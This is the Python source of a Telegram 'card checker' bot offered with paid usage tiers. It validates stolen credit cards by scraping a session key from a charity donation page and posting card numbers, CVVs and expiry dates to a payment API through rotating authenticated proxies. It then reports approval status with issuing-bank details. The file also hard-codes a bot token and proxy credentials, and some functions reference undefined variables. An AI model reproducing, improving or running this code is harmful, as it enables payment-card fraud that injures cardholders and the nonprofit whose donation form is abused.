import requests
from bs4 import BeautifulSoup
import telebot
import time
import threading
from datetime import datetime, timedelta
import os
import json
import re
import random

# Initialize Telegram bot
bot = telebot.TeleBot("7195510626:AAHdF4spBrcmWPPx9-1gogU1yKM1Rs5qe-s")

# Configuration
OWNER_ID = 6460703454
USER_DATA_FILE = "user_data.json"
PROXIES = [
"node1.veilpro.tech:6000:IoyTYu:K4NwIV",
"node1.veilpro.tech:6000:e0TSaD:B6cEuH"]  # Add proxies in format: "ip:port:user:pass"

# Initialize user data
if not os.path.exists(USER_DATA_FILE):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump({"premium_users": {}, "free_users": {}}, f)

# Load/save user data functions
def load_user_data():
    try:
        with open(USER_DATA_FILE, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {"premium_users": {}, "free_users": {}}

def save_user_data(data):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Proxy management
def get_random_proxy():
    if not PROXIES:
        return None
    proxy = random.choice(PROXIES)
    parts = proxy.split(':')
    return {
        'http': f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}",
        'https': f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    }

# Payment processing core
def process_payment(card_number, exp_month, exp_year, cvv):
    proxy = get_random_proxy()
    session = requests.Session()
    if proxy:
        session.proxies.update(proxy)

    try:
        # Handle expiration year
        exp_year = exp_year[-2:] if len(exp_year) == 4 else exp_year
        if len(exp_year) != 2:
            raise ValueError("Invalid expiration year format")

        # First request to get session key
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Referer': 'https://www.womensurgeons.org/'
        }
        response = session.get("https://donate.givedirect.org?cid=15724", headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        txnsession_key = soup.find('input', {'id': 'txnsession_key'})['value']

        # Payment request
        payload = {
            'origin': '1',
            'merchant': 'p1_mer_669021f7e934f033d1bc84f',
            'type': '2',
            'total': '0',
            'description': 'donate live site, p1_tss_67dc2d794c04afc058f2557',
            'payment[number]': card_number,
            'payment[cvv]': cvv,
            'expiration': f"{exp_month}{exp_year}",
            'zip': '',
            'last': 'Tech'
        }
        headers['txnsessionkey'] = txnsession_key
        response = session.post("https://api.payrix.com/txns", data=payload, headers=headers)
        data = response.json()

        # Handle response
        if data.get('response', {}).get('errors'):
            error_msg = data['response']['errors'][0]['msg']
            if "blocked from accessing this form" in error_msg:
                return "RISKY! RETRY THIS BIN LATER"
            return error_msg
        return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
    
    except Exception as e:
        return f"Error: {str(e)}"

# BIN information lookup
def get_bin_info(card_number):
    try:
        response = requests.get(f"https://api.juspay.in/cardbins/{card_number[:6]}")
        data = response.json()
        return {
            'brand': data.get('brand', 'Unknown'),
            'type': data.get('type', 'Unknown'),
            'bank': data.get('bank', 'Unknown'),
            'country': data.get('country', 'Unknown')
        }
    except:
        return {'brand': 'Unknown', 'type': 'Unknown', 'bank': 'Unknown', 'country': 'Unknown'}

# Rate limiting system
PLANS = {
    "1": {"name": "Basic", "cooldown": 15, "limit": 50},
    "2": {"name": "Mid-Tier", "cooldown": 13, "limit": 100},
    "3": {"name": "Premium", "cooldown": 7, "limit": 150}
}
FREE_COOLDOWN = 30
FREE_LIMIT = 10

def check_limits(user_id):
    user_data = load_user_data()
    now = datetime.now()
    
    if user_id == OWNER_ID:
        return True, None
    
    # Premium user check
    if str(user_id) in user_data['premium_users']:
        plan = PLANS[user_data['premium_users'][str(user_id)]['plan_id']]
        last_check = user_data['premium_users'][str(user_id)].get('last_check', 0)
        checks = [t for t in user_data['premium_users'][str(user_id)].get('checks', []) 
                 if (now - datetime.fromisoformat(t)).seconds < 3600]
        
        if len(checks) >= plan['limit']:
            return False, "Hourly limit reached"
        if time.time() - last_check < plan['cooldown']:
            return False, f"Cooldown: {plan['cooldown'] - int(time.time() - last_check)}s"
        
        user_data['premium_users'][str(user_id)]['last_check'] = time.time()
        user_data['premium_users'][str(user_id)]['checks'].append(now.isoformat())
        save_user_data(user_data)
        return True, None
    
    # Free user check
    else:
        last_check = user_data['free_users'].get(str(user_id), {}).get('last_check', 0)
        checks = [t for t in user_data['free_users'].get(str(user_id), {}).get('checks', [])
                 if (now - datetime.fromisoformat(t)).seconds < 3600]
        
        if len(checks) >= FREE_LIMIT:
            return False, "Free hourly limit reached"
        if time.time() - last_check < FREE_COOLDOWN:
            return False, f"Cooldown: {FREE_COOLDOWN - int(time.time() - last_check)}s"
        
        user_data['free_users'][str(user_id)] = {
            'last_check': time.time(),
            'checks': checks + [now.isoformat()]
        }
        save_user_data(user_data)
        return True, None

# Loading animation
def update_loading_bar(chat_id, message_id, start_time, done_event):
    bar_length = 20
    stages = ["Processing payment...", "Fetching BIN info...", "Finalizing..."]
    while not done_event.is_set():
        elapsed = time.time() - start_time
        if elapsed > 15:
            break
        progress = min(int((elapsed / 10) * 100), 100)
        bar = "█" * int(bar_length * progress/100) + "░" * (bar_length - int(bar_length * progress/100))
        stage = stages[min(int(elapsed/5), len(stages)-1)]
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"{stage}\n[{bar}] {progress}%\nElapsed: {elapsed:.1f}s"
            )
        except:
            pass
        time.sleep(0.5)

# Handler for start command (case-insensitive, supports /, ., !)
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'start')
def handle_start(message):
    user_id = message.from_user.id
    response = (
        f"👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗛𝗥𝗞'𝘀 𝗕𝗼𝘁, {message.from_user.first_name}!\n\n"
        f"⚡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
        f"📌 /𝗵𝗿𝗸 𝗰𝗮𝗿𝗱|𝗠𝗠|𝗬𝗬𝗬𝗬|𝗖𝗩𝗩 - 𝗖𝗵𝗲𝗰𝗸 𝗰𝗮𝗿𝗱\n"
        f"📌 /𝗶𝗻𝗳𝗼 - 𝗣𝗹𝗮𝗻 𝗶𝗻𝗳𝗼\n"
        f"🚀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗣𝗹𝗮𝗻𝘀:\n"
        f"🔹 𝗕𝗮𝘀𝗶𝗰: 𝟭𝟱𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟱𝟬/𝗵𝗿\n"
        f"🔹 𝗠𝗶𝗱-𝗧𝗶𝗲𝗿: 𝟭𝟯𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟭𝟬𝟬/𝗵𝗿\n"
        f"🔹 𝗧𝗼𝗽-𝗧𝗶𝗲𝗿: 𝟳𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟭𝟱𝟬/𝗵𝗿\n"
        f"🔄 𝗙𝗿𝗲𝗲: 𝟯𝟬𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟭𝟬/𝗵𝗿"
    )
    
    bot.reply_to(message, response)


# Handler for info command (case-insensitive, supports /, ., !)
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'info')
def handle_info(message):
    user_id = str(message.from_user.id)
    user_data = load_user_data()
    now = datetime.now()

    if int(user_id) == OWNER_ID:
        response = (
            f"👤 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼 {user_id}\n"
            f"📛 𝗣𝗹𝗮𝗻: 𝗢𝘄𝗻𝗲𝗿 (𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀 🚀)\n"
            f"⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 𝗡𝗼𝗻𝗲\n"
            f"🚀 𝗛𝗼𝘂𝗿𝗹𝘆 𝗟𝗶𝗺𝗶𝘁: 𝗜𝗻𝗳𝗶𝗻𝗶𝘁𝗲\n"
            f"✅ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸𝘀: 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱\n"
            f"🔄 𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝘀𝗲𝘁𝘀 𝗜𝗻: 𝗡𝗼𝘁 𝗔𝗽𝗽𝗹𝗶𝗰𝗮𝗯𝗹𝗲"
        )
    
    elif user_id in user_data["premium_users"]:
        user_info = user_data["premium_users"][user_id]
        plan_id = user_info["plan_id"]
        plan = PLANS[plan_id]
        cooldown = plan["cooldown"]
        hourly_limit = plan["hourly_limit"]
        checks = user_info.get("checks", [])
        
        valid_checks = [t for t in checks if now - datetime.fromisoformat(t) < timedelta(hours=1)]
        remaining_checks = max(hourly_limit - len(valid_checks), 0)
        
        if valid_checks:
            next_reset_time = datetime.fromisoformat(valid_checks[0]) + timedelta(hours=1)
            time_until_reset = str(next_reset_time - now).split('.')[0]
        else:
            time_until_reset = "𝗥𝗲𝘀𝗲𝘁𝘀 𝗼𝗻 𝗻𝗲𝘅𝘁 𝗿𝗲𝗾𝘂𝗲𝘀𝘁"

        response = (
            f"👤 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼 {user_id}\n"
            f"📛 𝗣𝗹𝗮𝗻: {plan['name']}\n"
            f"⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: {cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
            f"🚀 𝗛𝗼𝘂𝗿𝗹𝘆 𝗟𝗶𝗺𝗶𝘁: {hourly_limit}\n"
            f"✅ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸𝘀: {remaining_checks}\n"
            f"🔄 𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝘀𝗲𝘁𝘀 𝗜𝗻: {time_until_reset}"
        )
    
    else:
        user_info = user_data["free_users"].get(user_id, {})
        last_check = user_info.get("last_check", 0)
        checks = user_info.get("checks", [])
        
        valid_checks = [t for t in checks if now - datetime.fromisoformat(t) < timedelta(hours=1)]
        remaining_checks = max(FREE_HOURLY_LIMIT - len(valid_checks), 0)
        
        if valid_checks:
            next_reset_time = datetime.fromisoformat(valid_checks[0]) + timedelta(hours=1)
            time_until_reset = str(next_reset_time - now).split('.')[0]
        else:
            time_until_reset = "𝗥𝗲𝘀𝗲𝘁𝘀 𝗼𝗻 𝗻𝗲𝘅𝘁 𝗿𝗲𝗾𝘂𝗲𝘀𝘁"

        response = (
            f"👤 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼 {user_id}\n"
            f"📛 𝗣𝗹𝗮𝗻: 𝗙𝗿𝗲𝗲 𝗨𝘀𝗲𝗿\n"
            f"⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: {FREE_COOLDOWN} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
            f"🚀 𝗛𝗼𝘂𝗿𝗹𝘆 𝗟𝗶𝗺𝗶𝘁: {FREE_HOURLY_LIMIT}\n"
            f"✅ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸𝘀: {remaining_checks}\n"
            f"🔄 𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝘀𝗲𝘁𝘀 𝗜𝗻: {time_until_reset}"
        )
    
    bot.reply_to(message, response)


# Handler for plan command (case-insensitive, supports /, ., !)
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'plan')
def handle_plan(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")
        return
    
    try:
        _, user_id, plan_id = message.text.split()
        user_id = int(user_id)
        if plan_id not in PLANS:
            bot.reply_to(message, f"𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗹𝗮𝗻 𝗜𝗗. 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗽𝗹𝗮𝗻𝘀: {', '.join(PLANS.keys())}")
            return
        
        user_data = load_user_data()
        user_data["premium_users"][str(user_id)] = {
            "plan_id": plan_id,
            "last_check": 0,
            "checks": []
        }
        save_user_data(user_data)
        bot.reply_to(message, f"𝗨𝘀𝗲𝗿 {user_id} 𝗮𝘀𝘀𝗶𝗴𝗻𝗲𝗱 𝘁𝗼 {PLANS[plan_id]['name']} (𝗣𝗹𝗮𝗻 {plan_id}).")
    except ValueError:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗽𝗹𝗮𝗻 𝘂𝘀𝗲𝗿_𝗶𝗱 𝗽𝗹𝗮𝗻_𝗶𝗱")

@bot.message_handler(func=lambda m: True)
def handle_hrk(message):
    try:
        # Extract card details
        match = re.search(r'(\d{16})\|(\d{1,2})\|(\d{2,4})\|(\d{3})', message.text)
        if not match:
            return bot.reply_to(message, "❌ Invalid format! Use: /hrk 4929498471949004|04|29|468")
        
        card, month, year, cvv = match.groups()
        month = month.zfill(2)
        year = year[-2:] if len(year) == 4 else year

        # Check limits
        allowed, reason = check_limits(message.from_user.id)
        if not allowed:
            return bot.reply_to(message, f"⏳ {reason}")

        # Start processing
        start_time = time.time()
        done_event = threading.Event()
        msg = bot.reply_to(message, "⏳ Processing...")
        
        # Start loading thread
        threading.Thread(
            target=update_loading_bar,
            args=(message.chat.id, msg.message_id, start_time, done_event)
        ).start()

        # Process payment
        result = process_payment(card, month, year, cvv)
        bin_info = get_bin_info(card)
        elapsed = f"{time.time()-start_time:.2f}s"

        # Build response
        response = f"""
{"✅ Approved" if "Approved" in result else "❌ Declined"}

CC: {card}|{month}|{year}|{cvv}
Gateway: HRK Special Auth
Response: {result}

BIN: {bin_info['brand']} - {bin_info['type']}
Bank: {bin_info['bank']}
Country: {bin_info['country']}

Time: {elapsed}"""
        
        done_event.set()
        bot.edit_message_text(response, message.chat.id, msg.message_id)

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Start bot
print("🟢 Bot is running...")
bot.polling()
